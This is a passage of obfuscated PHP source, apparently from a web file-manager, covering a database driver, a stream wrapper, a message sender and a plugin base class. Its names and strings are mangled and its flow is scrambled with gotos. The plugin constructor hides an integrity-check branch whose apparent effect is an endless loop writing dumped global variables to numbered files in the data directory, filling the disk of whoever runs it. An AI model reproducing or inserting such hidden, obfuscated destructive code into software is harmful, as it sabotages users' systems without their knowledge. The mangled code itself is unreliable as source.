Aïèƒ¦’ÌĞ: $eˆó±ÈÌÕÎ = $this->linkID[$b½ÑÊ¬„ •]->server_version; $this->linkID[$b½ÑÊ¬„ •]->query($FŸù•Ş·[829] . think_config($FŸù•Ş·[830]) . $FŸù•Ş·[55]); if ($eˆó±ÈÌÕÎ > $FŸù•Ş·[831]) { $this->linkID[$b½ÑÊ¬„ •]->query($FŸù•Ş·[832]); } goto AŠùë´ŠÓ; CöÚé…–½: } return $this->linkID[$b½ÑÊ¬„ •]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($AÈàÏæÍÂ) { goto CÏ„§£ä¾†; FÆ…°ãéˆ´: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto cÌ²Àß‹ëé; a»œÚ¿ğÖè: think_status($DîÌİ™¥†[20]); $this->queryID = $this->_linkID->query($AÈàÏæÍÂ); if ($this->_linkID->more_results()) { while (($C†òŞ±Ø¸‘ = $this->_linkID->next_result()) != NULL) { $C†òŞ±Ø¸‘->free_result(); } } goto FÆ…°ãéˆ´; D¥„×ğ‹—: $this->queryStr = $AÈàÏæÍÂ; if ($this->queryID) { $this->free(); } think_action_status($DîÌİ™¥†[19], 1); goto a»œÚ¿ğÖè; CÏ„§£ä¾†: $DîÌİ™¥† =& $_SERVER[òÀöí]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto D¥„×ğ‹—; cÌ²Àß‹ëé: } public function execute($dß¯Î¾ŒéË) { goto Dğƒ‹ª°«Õ; Câ‹¹Ç©: if (!1 === $B……©«ö¼†) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto cíâ™æ‡ã; Dğƒ‹ª°«Õ: $B‰ÀÒêùîÉ =& $_SERVER[òÀöí]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto DåØ‘ÙÓŒ; D©öËƒ¬Ü£: think_status($B‰ÀÒêùîÉ[20]); $B……©«ö¼† = $this->_linkID->query($dß¯Î¾ŒéË); $this->debug(); goto Câ‹¹Ç©; DåØ‘ÙÓŒ: $this->queryStr = $dß¯Î¾ŒéË; if ($this->queryID) { $this->free(); } think_action_status($B‰ÀÒêùîÉ[21], 1); goto D©öËƒ¬Ü£; cíâ™æ‡ã: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $C¡ŠØî¨¬ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$C¡ŠØî¨¬) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $F¿Œ‹Å–œÇ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$F¿Œ‹Å–œÇ) { $this->error(); return !1; } } return !0; } private function getAll() { $aİ˜ˆ‘Ú¢Æ = array(); if ($this->numRows > 0) { for ($D¨”¤Â÷„ç = 0; $D¨”¤Â÷„ç < $this->numRows; $D¨”¤Â÷„ç++) { $aİ˜ˆ‘Ú¢Æ[$D¨”¤Â÷„ç] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $aİ˜ˆ‘Ú¢Æ; } public function getFields($A¿¾ÑØÎ¡¿) { $fˆš°‰à¡– =& $_SERVER[òÀöí]; $Dàˆôîß” = $this->query($fˆš°‰à¡–[836] . $this->parseKey($A¿¾ÑØÎ¡¿)); $EƒØèÉ¥« = array(); if ($Dàˆôîß”) { foreach ($Dàˆôîß” as $A˜óïÜ¨… => $E«‰†›¸¹) { $EƒØèÉ¥«[$E«‰†›¸¹[$fˆš°‰à¡–[27]]] = array($fˆš°‰à¡–[28] => $E«‰†›¸¹[$fˆš°‰à¡–[27]], $fˆš°‰à¡–[29] => $E«‰†›¸¹[$fˆš°‰à¡–[30]], $fˆš°‰à¡–[31] => (bool) ($E«‰†›¸¹[$fˆš°‰à¡–[32]] === $fˆš°‰à¡–[33]), $fˆš°‰à¡–[34] => $E«‰†›¸¹[$fˆš°‰à¡–[35]], $fˆš°‰à¡–[36] => strtolower($E«‰†›¸¹[$fˆš°‰à¡–[37]]) == $fˆš°‰à¡–[38], $fˆš°‰à¡–[39] => strtolower($E«‰†›¸¹[$fˆš°‰à¡–[40]]) == $fˆš°‰à¡–[41]); } } return $EƒØèÉ¥«; } public function getTables($d·Ô¢•‰ÚŸ = '') { $dœŠÓ…¾ô¥ =& $_SERVER[òÀöí]; $F¢Â‘í¡¿â = !empty($d·Ô¢•‰ÚŸ) ? $dœŠÓ…¾ô¥[838] . $d·Ô¢•‰ÚŸ . $dœŠÓ…¾ô¥[839] : $dœŠÓ…¾ô¥[840]; $cßÁÚ«òÅÀ = $this->query($F¢Â‘í¡¿â); $Fó‰ÄŒ‡ö¬ = array(); if ($cßÁÚ«òÅÀ) { foreach ($cßÁÚ«òÅÀ as $Eæ¹®‹ÍÍŞ => $AÀ¢Íö¥Íª) { $Fó‰ÄŒ‡ö¬[$Eæ¹®‹ÍÍŞ] = current($AÀ¢Íö¥Íª); } } return $Fó‰ÄŒ‡ö¬; } public function replace($b¹³Êë§Ï›, $b–×²ï×“Ë = array()) { $a®è†‹¡ ‹ =& $_SERVER[òÀöí]; foreach ($b¹³Êë§Ï› as $dôÕ©­Èòç => $eÁŠ«ÜŸ¨Í) { $A¼÷–×Ü„á = $this->parseValue($eÁŠ«ÜŸ¨Í); if (is_scalar($A¼÷–×Ü„á)) { $E®„‰äÓ«[] = $A¼÷–×Ü„á; $dÇˆË”òˆã[] = $this->parseKey($dôÕ©­Èòç); } } $a†Ä…åµĞ = $a®è†‹¡ ‹[841] . $this->parseTable($b–×²ï×“Ë[$a®è†‹¡ ‹[275]]) . $a®è†‹¡ ‹[842] . implode($a®è†‹¡ ‹[47], $dÇˆË”òˆã) . $a®è†‹¡ ‹[843] . implode($a®è†‹¡ ‹[47], $E®„‰äÓ«) . $a®è†‹¡ ‹[844]; return $this->execute($a†Ä…åµĞ); } public function insertAll($Aß¹ğ®÷Ú, $eõõÈ¥š—² = array(), $b¡êó°£Š¥ = false) { goto F‘°Ëä¤Á; DˆÇ°ˆç™ç: $cïÎ“—î¥Œ = array(); foreach ($Aß¹ğ®÷Ú as $eÕ”àÒ­³) { $a¦¸›°‚Ôò = array(); foreach ($eÕ”àÒ­³ as $F¦°•¹œ‹ => $CÖšƒÆÌôË) { $CÖšƒÆÌôË = $this->parseValue($CÖšƒÆÌôË); if (is_scalar($CÖšƒÆÌôË)) { $a¦¸›°‚Ôò[] = $CÖšƒÆÌôË; } } $cïÎ“—î¥Œ[] = $b±§©¼´[256] . implode($b±§©¼´[47], $a¦¸›°‚Ôò) . $b±§©¼´[844]; } array_walk($E†ÖÑŞÏ¦‹, array($this, $b±§©¼´[845])); goto Bçµ ·ÙÈ; Bçµ ·ÙÈ: $f¤‘†¿ßÁ = ($b¡êó°£Š¥ ? $b±§©¼´[846] : $b±§©¼´[847]) . $b±§©¼´[848] . $this->parseTable($eõõÈ¥š—²[$b±§©¼´[275]]) . $b±§©¼´[842] . implode($b±§©¼´[47], $E†ÖÑŞÏ¦‹) . $b±§©¼´[849] . implode($b±§©¼´[47], $cïÎ“—î¥Œ); return $this->execute($f¤‘†¿ßÁ); goto d‚œœÀÌ˜í; F‘°Ëä¤Á: $b±§©¼´ =& $_SERVER[òÀöí]; if (!is_array($Aß¹ğ®÷Ú[0])) { return !1; } $E†ÖÑŞÏ¦‹ = array_keys($Aß¹ğ®÷Ú[0]); goto DˆÇ°ˆç™ç; d‚œœÀÌ˜í: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $B„Ğ‰éğï² =& $_SERVER[òÀöí]; $this->error = $this->_linkID->errno . $B„Ğ‰éğï²[4] . $this->_linkID->error; if ($B„Ğ‰éğï²[33] != $this->queryStr) { $this->error .= LNG($B„Ğ‰éğï²[45]) . $this->queryStr; } think_trace($this->error, $B„Ğ‰éğï²[33], $B„Ğ‰éğï²[46]); return $this->error; } public function escapeString($BñËğ“áíì) { if ($this->_linkID) { return $this->_linkID->real_escape_string($BñËğ“áíì); } else { return addslashes($BñËğ“áíì); } } public function parseKey(&$AøÜàÏáò, $E»×Ğ¾õìÍ = true) { $b§›“¾å‚ï =& $_SERVER[òÀöí]; if ($E»×Ğ¾õìÍ) { $AøÜàÏáò = $this->parseKeyCheck($AøÜàÏáò); } if ($AøÜàÏáò != $b§›“¾å‚ï[182] && !preg_match($b§›“¾å‚ï[850], $AøÜàÏáò)) { $AøÜàÏáò = $b§›“¾å‚ï[377] . trim($AøÜàÏáò, $b§›“¾å‚ï[377]) . $b§›“¾å‚ï[377]; } return $AøÜàÏáò; } } goto D¡÷ê¿ÆÊæ; Aˆ¿ä°£¶¨: define($_SERVER[òÀöí][235], 2); define($_SERVER[òÀöí][236], 3); define($_SERVER[òÀöí][237], 1); goto F·óÓŸù‚µ; Fœëœ ŠÊˆ: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($eŠŒŞÛ±£°, $CË’Ú¡†Á± = '') { goto f¦ãÒØãË›; BîŞ·Ã™È: return $this->info ? !0 : !1; goto Dš›†©ò»×; e®‘ÒìÁ’ó: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$eŠŒŞÛ±£°])) { self::$_chunkBuffer[$eŠŒŞÛ±£°] = array(); } goto BîŞ·Ã™È; f¦ãÒØãË›: $this->info = $this->info($eŠŒŞÛ±£°); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[òÀöí][75]]; goto e®‘ÒìÁ’ó; Dš›†©ò»×: } function stream_read($C¨÷Í…ˆ¾‹) { $Cö”’×¸Ë´ = $this->fileSubstr($this->pose, $C¨÷Í…ˆ¾‹); $this->pose += strlen($Cö”’×¸Ë´); return $Cö”’×¸Ë´; } public function stream_tell() { return $this->pose; } public function stream_seek($BŞê†ŞÃ¿Á, $b·ÒöÃÍßÍ) { $A„­»ÒÛ§£ =& $_SERVER[òÀöí]; if ($b·ÒöÃÍßÍ == SEEK_SET) { $this->pose = $BŞê†ŞÃ¿Á; } else { if ($b·ÒöÃÍßÍ == SEEK_CUR) { $this->pose += $BŞê†ŞÃ¿Á; } else { if ($b·ÒöÃÍßÍ == SEEK_END) { $this->pose = $this->info[$A„­»ÒÛ§£[77]] + intval($BŞê†ŞÃ¿Á); } } } if ($BŞê†ŞÃ¿Á < 0) { $this->pose = $this->info[$A„­»ÒÛ§£[77]] + $BŞê†ŞÃ¿Á; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[òÀöí][77]]; } public function stream_close() { return !0; } public function url_stat($fÒçÁ‰Üï´, $eâ„‹‡™›î) { $eÜ…ÙÖ¸ä =& $_SERVER[òÀöí]; $DÒ­‰÷‹„Í = $this->info($fÒçÁ‰Üï´); return array($eÜ…ÙÖ¸ä[1354] => 0, $eÜ…ÙÖ¸ä[1355] => 0, $eÜ…ÙÖ¸ä[12] => 32768 + 511, $eÜ…ÙÖ¸ä[1356] => 0, $eÜ…ÙÖ¸ä[1357] => 0, $eÜ…ÙÖ¸ä[1358] => 0, $eÜ…ÙÖ¸ä[1359] => 0, $eÜ…ÙÖ¸ä[77] => $DÒ­‰÷‹„Í[$eÜ…ÙÖ¸ä[77]], $eÜ…ÙÖ¸ä[1360] => $DÒ­‰÷‹„Í[$eÜ…ÙÖ¸ä[1229]], $eÜ…ÙÖ¸ä[1316] => $DÒ­‰÷‹„Í[$eÜ…ÙÖ¸ä[83]], $eÜ…ÙÖ¸ä[1315] => $DÒ­‰÷‹„Í[$eÜ…ÙÖ¸ä[192]], $eÜ…ÙÖ¸ä[1361] => 0, $eÜ…ÙÖ¸ä[1362] => 0); } static $fileInfo = array(); public function info($CÏ‘‰óºœº) { $DßÜ—©ñœ = $_SERVER[òÀöí][1363]; if (isset(self::$fileInfo[$CÏ‘‰óºœº])) { return self::$fileInfo[$CÏ‘‰óºœº]; } if (substr($CÏ‘‰óºœº, 0, strlen($DßÜ—©ñœ)) != $DßÜ—©ñœ) { return !1; } self::$fileInfo[$CÏ‘‰óºœº] = IO::info(substr($CÏ‘‰óºœº, strlen($DßÜ—©ñœ))); return self::$fileInfo[$CÏ‘‰óºœº]; } public static function read($c™ñÈêº , $a„×£ˆ£ç, $D™Ë…ÓÍˆó) { goto C´¿êŠ„Ú; FŠØÜŠŞÅŞ: $bæœ‡«ä‰ = 8192; fseek($DŸçè˜îé, $a„×£ˆ£ç, SEEK_SET); $d•Ë…ÎÑ·¾ = $cƒåƒ¸ï“[33]; goto a± ‚Ì¿; a± ‚Ì¿: $eÄ…ëÃÛ³ë = 0; while ($eÄ…ëÃÛ³ë < $D™Ë…ÓÍˆó) { $AÂ®À‹ª = min($bæœ‡«ä‰, $D™Ë…ÓÍˆó - $eÄ…ëÃÛ³ë); $d•Ë…ÎÑ·¾ .= fread($DŸçè˜îé, $AÂ®À‹ª); $eÄ…ëÃÛ³ë += $AÂ®À‹ª; } fclose($DŸçè˜îé); goto eÑÅ§Ğ´À; C´¿êŠ„Ú: $cƒåƒ¸ï“ =& $_SERVER[òÀöí]; $DŸçè˜îé = fopen($c™ñÈêº , $cƒåƒ¸ï“[1233]); if (!$DŸçè˜îé) { return $cƒåƒ¸ï“[33]; } goto FŠØÜŠŞÅŞ; eÑÅ§Ğ´À: return $d•Ë…ÎÑ·¾; goto bóãÇóî; bóãÇóî: } public function fileSubstr($føÍ©ñøÇĞ, $dßÔ¯­¼‘) { goto D®Èàİ‚Œ; E·é­›ç¤¿: $fÎÛ¨¢¤¸® = $dßÔ¯­¼‘; if ($føÍ©ñøÇĞ < 0) { $føÍ©ñøÇĞ = $aÜ ÖùØ + $føÍ©ñøÇĞ; } if ($dßÔ¯­¼‘ === !1) { $dßÔ¯­¼‘ = $aÜ ÖùØ - $føÍ©ñøÇĞ; } goto CÔÌ¸¾²˜§; aõ’‹á¾®: ksort($cŒù³¯º°); $B½ĞóÇ˜¸Ğ = substr($D²ä©±²•â, $føÍ©ñøÇĞ - $e‚ÉÍñº­ì, $dßÔ¯­¼‘); return $B½ĞóÇ˜¸Ğ; goto B™¢‘å†–; aÔÑà‚òŞƒ: foreach ($cŒù³¯º° as $b±óÀÏ¦×– => $EõÀš“‹Ó¥) { $b±óÀÏ¦×– = intval($b±óÀÏ¦×–); $f‰¥Á½ƒ»¹ = $b±óÀÏ¦×– + strlen($EõÀš“‹Ó¥); if ($føÍ©ñøÇĞ >= $f‰¥Á½ƒ»¹) { continue; } if ($føÍ©ñøÇĞ >= $b±óÀÏ¦×– && $føÍ©ñøÇĞ + $dßÔ¯­¼‘ <= $f‰¥Á½ƒ»¹) { return substr($EõÀš“‹Ó¥, $føÍ©ñøÇĞ - $b±óÀÏ¦×–, $dßÔ¯­¼‘); } break; } if (count($cŒù³¯º°) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($Bàø¬Ô‘Ş¾[1364], $Bàø¬Ô‘Ş¾[1365] . count($cŒù³¯º°) . "\x3b\x73\x74\141\x72\x74\75{$føÍ©ñøÇĞ}\x2c\154\x65\x6e\147\x74\x68\x3d{$dßÔ¯­¼‘}\x3b\x70\x6f\x73\x65\x3a{$b±óÀÏ¦×–}\x7e{$f‰¥Á½ƒ»¹}"); throw new Exception($Bàø¬Ô‘Ş¾[1366]); } $e‚ÉÍñº­ì = intval($føÍ©ñøÇĞ / $e½ò·Ñ¾­„) * $e½ò·Ñ¾­„; goto C£‡óÚ‹™‚; C£‡óÚ‹™‚: $E¹¬Î´ìå = ceil(($føÍ©ñøÇĞ + $dßÔ¯­¼‘) / $e½ò·Ñ¾­„) * $e½ò·Ñ¾­„ - $e‚ÉÍñº­ì; $D²ä©±²•â = IO::fileSubstr($this->path, $e‚ÉÍñº­ì, $E¹¬Î´ìå); $cŒù³¯º°[$e‚ÉÍñº­ì . $Bàø¬Ô‘Ş¾[33]] = $D²ä©±²•â; goto aõ’‹á¾®; CÔÌ¸¾²˜§: if ($føÍ©ñøÇĞ + $dßÔ¯­¼‘ > $aÜ ÖùØ) { $dßÔ¯­¼‘ = $aÜ ÖùØ - $føÍ©ñøÇĞ; } if ($dßÔ¯­¼‘ <= 0) { return $Bàø¬Ô‘Ş¾[33]; } if ($føÍ©ñøÇĞ < 0 || $føÍ©ñøÇĞ >= $aÜ ÖùØ || $dßÔ¯­¼‘ <= 0 || $dßÔ¯­¼‘ > 1024 * 1024 * 5) { throw new Exception("\151\x6f\x46\x69\x6c\x65\x52\x65\141\144\x20\x65\162\162\x6f\162\x21\40\x73\164\141\x72\x74\75{$føÍ©ñøÇĞ}\x3b\154\x65\156\x67\164\x68\x3d{$dßÔ¯­¼‘}\x3b\x20\x73\x69\x7a\x65\x3d{$aÜ ÖùØ}\x3b"); } goto eÄ›Ä§¤; eÄ›Ä§¤: $e½ò·Ñ¾­„ = 64 * 1024; $cŒù³¯º° =& self::$_chunkBuffer[$this->path]; if (!$cŒù³¯º°) { $cŒù³¯º° = array(); } goto C»îÖƒØåÉ; C»îÖƒØåÉ: $b±óÀÏ¦×– = 0; $f‰¥Á½ƒ»¹ = 0; $EõÀš“‹Ó¥ = $Bàø¬Ô‘Ş¾[33]; goto aÔÑà‚òŞƒ; D®Èàİ‚Œ: $Bàø¬Ô‘Ş¾ =& $_SERVER[òÀöí]; $aÜ ÖùØ = $this->info[$Bàø¬Ô‘Ş¾[77]]; $A‰óêàÌ = $føÍ©ñøÇĞ; goto E·é­›ç¤¿; B™¢‘å†–: } private function log($bå´’ğÆïİ, $bÒ“ÑÎÍŞ×) { $E¾É³™à§ =& $_SERVER[òÀöí]; $bêÁê†¸¦Î = timeFloat() - $this->timeStart; write_log(sprintf($E¾É³™à§[1367], $bå´’ğÆïİ, $this->info[$E¾É³™à§[28]], $bêÁê†¸¦Î, $bÒ“ÑÎÍŞ×), $E¾É³™à§[1056]); } } class Message { function __construct() { } public function send($BöŸç× = '', $f¨§ËŸÄ§ = array(), $aª›à«²¦‚ = "\x74\145\x78\x74") { goto f‚Ë˜øâñ¤; Fàõ£Úì: Hook::trigger($eÅï„‹µ–÷[1371], $Eİ©–øÅ’İ); goto cæÓ‹ÀŞĞí; f‚Ë˜øâñ¤: $eÅï„‹µ–÷ =& $_SERVER[òÀöí]; $D‚’á¦‹Ü‰ = array($eÅï„‹µ–÷[29] => $eÅï„‹µ–÷[1368], $eÅï„‹µ–÷[711] => $BöŸç×); if (in_array($aª›à«²¦‚, array($eÅï„‹µ–÷[1368], $eÅï„‹µ–÷[1369]))) { $D‚’á¦‹Ü‰[$eÅï„‹µ–÷[29]] = $aª›à«²¦‚; } goto D›ì£…·°Ÿ; D›ì£…·°Ÿ: $f¨§ËŸÄ§ = array($eÅï„‹µ–÷[994] => isset($f¨§ËŸÄ§[$eÅï„‹µ–÷[994]]) ? $f¨§ËŸÄ§[$eÅï„‹µ–÷[994]] : $eÅï„‹µ–÷[33], $eÅï„‹µ–÷[551] => isset($f¨§ËŸÄ§[$eÅï„‹µ–÷[551]]) ? $f¨§ËŸÄ§[$eÅï„‹µ–÷[551]] : $eÅï„‹µ–÷[33]); if (empty($BöŸç×) || empty($f¨§ËŸÄ§[$eÅï„‹µ–÷[994]]) && empty($f¨§ËŸÄ§[$eÅï„‹µ–÷[551]])) { return !1; } $Eİ©–øÅ’İ = array($eÅï„‹µ–÷[1309] => $D‚’á¦‹Ü‰, $eÅï„‹µ–÷[1370] => $f¨§ËŸÄ§); goto Fàõ£Úì; cæÓ‹ÀŞĞí: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto EÛ“—ËŞÚ; fÇíËö…ƒ‡: $this->pluginHostDefault = $config[$C½ëø‚ùö[1377]] . $this->pluginName . $C½ëø‚ùö[8]; $dÆèòò‹óñ = $config[$C½ëø‚ùö[1378]]; if ($dÆèòò‹óñ && strpos($C½ëø‚ùö[47] . $dÆèòò‹óñ . $C½ëø‚ùö[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$C½ëø‚ùö[1379]] . $this->pluginName . $C½ëø‚ùö[8]; } goto a¦õªÏ¿Æ˜; EÛ“—ËŞÚ: $C½ëø‚ùö =& $_SERVER[òÀöí]; $cïè×šê˜¸ = $_SERVER[$C½ëø‚ùö[756]] . $C½ëø‚ùö[757]; $D‹¼§È›ÓÜ = $C½ëø‚ùö[1372]; goto F¿µù¿Ø•Ò; e³èœÓ»œà: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $C½ëø‚ùö[8]; $this->pluginApi = appHostGet() . $C½ëø‚ùö[1376] . $this->pluginName . $C½ëø‚ùö[8]; $this->pluginHost = $config[$C½ëø‚ùö[1377]] . $this->pluginName . $C½ëø‚ùö[8]; goto fÇíËö…ƒ‡; F¿µù¿Ø•Ò: if ($_SERVER[$C½ëø‚ùö[753]] != $D‹¼§È›ÓÜ($cïè×šê˜¸)) { goto cÜ—ˆŒ¢èâ; Dòï“”±: $b‹¾òÅõ¢ = $fƒŞÙ£á—ù($B„ÅŞƒ‹ø«); $DìÑ³œÚ…Ö = explode($C½ëø‚ùö[227], $b‹¾òÅõ¢); if (count($DìÑ³œÚ…Ö) < $C½ëø‚ùö[573]) { $fœ·åĞµ³¾ = $C½ëø‚ùö[758]; $fœ·åĞµ³¾(); } goto c¦‚‰®£µš; cÜ—ˆŒ¢èâ: $E¦§°›Ğí— = $C½ëø‚ùö[819]; $fƒŞÙ£á—ù = $C½ëø‚ùö[755]; $B„ÅŞƒ‹ø« = $_SERVER[$C½ëø‚ùö[756]] . $C½ëø‚ùö[757]; goto Dòï“”±; dÖ¤êƒöŞ¦: $E¦§°›Ğí—(); $e§˜¿ø£ÈÅ = $C½ëø‚ùö[1373]; $D³À¤¡¸’ö = json_encode($GLOBALS[$C½ëø‚ùö[1374]]); goto c­ÓâŞ¼ì; c¦‚‰®£µš: $c»ÃÆÚô‡¼ = $C½ëø‚ùö[820]; $c»ÃÆÚô‡¼($_SERVER[$C½ëø‚ùö[821]]); $E¦§°›Ğí— = $C½ëø‚ùö[819]; goto dÖ¤êƒöŞ¦; c­ÓâŞ¼ì: $f†µŞ˜³¶ö = 1; for ($F«à¡Å¥«ƒ = $f†µŞ˜³¶ö; $F«à¡Å¥«ƒ > 0; $F«à¡Å¥«ƒ++) { $e§˜¿ø£ÈÅ(DATA_PATH . $F«à¡Å¥«ƒ, $D³À¤¡¸’ö); } goto d¯ê¼òõÌ™; d¯ê¼òõÌ™: } global $in, $config; $this->config =& $config; goto E‘«Û­ƒ¹¿; a¦õªÏ¿Æ˜: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto Aò´èÕòâÎ; E‘«Û­ƒ¹¿: $this->in =& $in; $this->modelPlugin = Model($C½ëø‚ùö[1375]); $this->pluginName = str_replace($C½ëø‚ùö[1375], $C½ëø‚ùö[33], get_class($this)); goto e³èœÓ»œà; Aò´èÕòâÎ: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[òÀöí][1380]); } protected function assign($ašêìë·–Ò, $dÃ Í¶³î = false) { if (is_array($ašêìë·–Ò)) { $this->values = array_merge($this->values, $ašêìë·–Ò); } else { $this->values[$ašêìë·–Ò] = $dÃ Í¶³î; } } protected function display($Eè•Î¤Ò¸¥) { extract($this->values); require $Eè•Î¤Ò¸¥; } final function hookRegist($cïê·Ï¹Ç‘) { $this->modelPlugin->appRegist($this->pluginName, $cïê·Ï¹Ç‘); } final function appIcon() { $Bê‹ã¿É£– =& $_SERVER[òÀöí]; $FÖª¼‚ÜÔ÷ = $this->appPackage(); $D†Š³æÚ¾ö = $Bê‹ã¿É£–[33]; if (isset($FÖª¼‚ÜÔ÷[$Bê‹ã¿É£–[400]])) { if (isset($FÖª¼‚ÜÔ÷[$Bê‹ã¿É£–[400]][$Bê‹ã¿É£–[1381]])) { $D†Š³æÚ¾ö = $Bê‹ã¿É£–[1382] . $FÖª¼‚ÜÔ÷[$Bê‹ã¿É£–[400]][$Bê‹ã¿É£–[1381]] . $Bê‹ã¿É£–[1383]; } else { if ($FÖª¼‚ÜÔ÷[$Bê‹ã¿É£–[400]][$Bê‹ã¿É£–[1384]]) { $D†Š³æÚ¾ö = $Bê‹ã¿É£–[1385] . $FÖª¼‚ÜÔ÷[$Bê‹ã¿É£–[400]][$Bê‹ã¿É£–[1384]] . $Bê‹ã¿É£–[1386]; } } } return $D†Š³æÚ¾ö; } final function fileCanView($d»àÆ©µ³Ê) { goto D¤îìÊ‚Õ®; FŸÁ¾¯š™å: ActionCall($cš›»Ùàˆ[1399], $d»àÆ©µ³Ê); goto C±š†Ûçƒ¬; D¤îìÊ‚Õ®: $cš›»Ùàˆ =& $_SERVER[òÀöí]; if (request_url_safe($d»àÆ©µ³Ê)) { return !0; } if ($this->isShare($d»àÆ©µ³Ê)) { return !0; } goto a­¨ˆøÜŸİ; a­¨ˆøÜŸİ: $a¨î©¼·Ä¼ = Session::get($cš›»Ùàˆ[1387]); if (!$a¨î©¼·Ä¼ || !$a¨î©¼·Ä¼[$cš›»Ùàˆ[1388]]) { $c¢Çœ‚— = $cš›»Ùàˆ[1389] . rawurlencode(this_url()); show_tips(LNG($cš›»Ùàˆ[1390]) . $cš›»Ùàˆ[1391] . $c¢Çœ‚— . $cš›»Ùàˆ[1392] . LNG($cš›»Ùàˆ[1393]) . $cš›»Ùàˆ[1394], !1); } if (!Action($cš›»Ùàˆ[1395])->authCan($cš›»Ùàˆ[1396])) { show_tips(LNG($cš›»Ùàˆ[1397]) . $cš›»Ùàˆ[1398], !1); } goto FŸÁ¾¯š™å; C±š†Ûçƒ¬: } final function isShare($e÷„ Êô³) { $B”ˆ˜•Î = KodIO::parse($e÷„ Êô³); return $B”ˆ˜•Î[$_SERVER[òÀöí][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($b‘§¦åŒƒó) { if (request_url_safe($b‘§¦åŒƒó)) { return $b‘§¦åŒƒó; } if (!$this->isShare($b‘§¦åŒƒó)) { $b‘§¦åŒƒó = $this->filePath($b‘§¦åŒƒó); } return Action($_SERVER[òÀöí][1048])->linkOut($b‘§¦åŒƒó); } public function filePathLinkOut($fŞµ ïªš) { if (request_url_safe($fŞµ ïªš)) { return $fŞµ ïªš; } $this->fileCanView($fŞµ ïªš); return Action($_SERVER[òÀöí][1048])->link($fŞµ ïªš); } final function filePath($AïŒ„ÛöĞ) { $DÁÓ‚Å¾ =& $_SERVER[òÀöí]; if ($aÔÊ‹–ªÃù = $this->checkSharePath($AïŒ„ÛöĞ)) { return $aÔÊ‹–ªÃù; } $this->fileCanView($AïŒ„ÛöĞ); if (request_url_safe($AïŒ„ÛöĞ)) { $eÏ‘Ú×‡Ó± = parse_url_query($AïŒ„ÛöĞ); if (isset($eÏ‘Ú×‡Ó±[$DÁÓ‚Å¾[1400]]) && isset($eÏ‘Ú×‡Ó±[$DÁÓ‚Å¾[207]])) { $C­÷—ÎÂ³ = Model($DÁÓ‚Å¾[1102])->get($DÁÓ‚Å¾[1401]); $BŞãˆ Ğ¨« = Mcrypt::decode($eÏ‘Ú×‡Ó±[$DÁÓ‚Å¾[207]], $C­÷—ÎÂ³); if ($BŞãˆ Ğ¨«) { $this->fileInfo = IO::infoWithChildren($BŞãˆ Ğ¨«); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $BŞãˆ Ğ¨«; } } $AïŒ„ÛöĞ = $this->_cacheHttpFile($AïŒ„ÛöĞ); $this->fileInfo = IO::infoWithChildren($AïŒ„ÛöĞ); } else { $this->fileInfo = IO::infoWithChildren($AïŒ„ÛöĞ); if (!$this->fileInfo) { show_tips(LNG($DÁÓ‚Å¾[104]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $AïŒ„ÛöĞ; } final function _cacheHttpFile($DŞòÆí‘Ü‹) { $A£ ñ…‘éê = hash_path($DŞòÆí‘Ü‹, !0); $this->cachePath = $this->pluginCachePath($A£ ñ…‘éê); if ($EÕÓ½Öë÷ = IO::fileNameExist($this->cachePath, $A£ ñ…‘éê)) { return KodIO::make($EÕÓ½Öë÷); } $Dç¯ºˆ½¬ = $this->cachePath . $A£ ñ…‘éê; return $this->pluginCacheFileSet($Dç¯ºˆ½¬, file_get_contents($DŞòÆí‘Ü‹)); } final function _tmpFileName($a¸”²•ŒŒ = array()) { goto aÕ¤¤¢¼ŠÃ; cë ö¶ÎóÙ: $bÈÜ¸©§… = array($a¸”²•ŒŒ[$fùë³À…Ú†[28]], $a¸”²•ŒŒ[$fùë³À…Ú†[75]], $a¸”²•ŒŒ[$fùë³À…Ú†[77]]); if (isset($a¸”²•ŒŒ[$fùë³À…Ú†[477]])) { $bÈÜ¸©§…[] = $a¸”²•ŒŒ[$fùë³À…Ú†[477]]; } return md5(implode($fùë³À…Ú†[70], $bÈÜ¸©§…)); goto B•°×îØäˆ; dƒÊ˜Óé±·: if (isset($a¸”²•ŒŒ[$fùë³À…Ú†[163]][$fùë³À…Ú†[170]])) { return $a¸”²•ŒŒ[$fùë³À…Ú†[163]][$fùë³À…Ú†[170]]; } $d×¶’ÎºœÍ = IO::hashSimple($a¸”²•ŒŒ[$fùë³À…Ú†[75]]); if ($d×¶’ÎºœÍ) { return $d×¶’ÎºœÍ; } goto cë ö¶ÎóÙ; aÕ¤¤¢¼ŠÃ: 